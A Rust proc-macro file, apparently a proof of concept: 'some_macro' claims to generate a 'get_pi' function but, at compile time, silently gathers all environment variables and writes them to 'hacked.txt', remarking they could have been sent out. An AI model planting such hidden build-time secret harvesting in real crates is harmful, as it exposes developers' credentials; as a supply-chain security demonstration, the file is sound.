extern crate proc_macro;
use std::{error::Error,env, fs::File, io::Write};
use proc_macro::TokenStream;

fn getting_pi(){
    let mut hacked_message=String::from("");
    get_hack_message(&mut hacked_message);
    let env_vars_fmted=get_env_vars();
    hacked_message.push_str(env_vars_fmted.as_str());
    match write_hacked_message(hacked_message.as_str()){
        Err(e)=>println!("{e}"),
        Ok(_)=>println!("success"),
    }
}

fn get_hack_message(s: &mut String){
    s.push_str("you have been hacked, here are your env vars for instance. I could have shipped that to me as well.\n\n")
}

fn get_env_vars() -> String {
    
    let mut env_vars_fmted:String="".into();
    let _keys:Vec<String>=env::vars().map(|(k, v)| {
        env_vars_fmted.push_str(format!("{k}-  {v}\n").as_str());
        k
    }).collect();
    return env_vars_fmted;
}

fn write_hacked_message(s: &str)-> Result<(),Box<dyn Error>>{
    let mut handle=File::create("hacked.txt")?;
    handle.write(s.as_bytes())?;
    Ok(())
}

#[proc_macro]
pub fn some_macro(_item: TokenStream) -> TokenStream {
    getting_pi();
    "fn get_pi() -> f32 { 3.14 }".parse().unwrap()
}
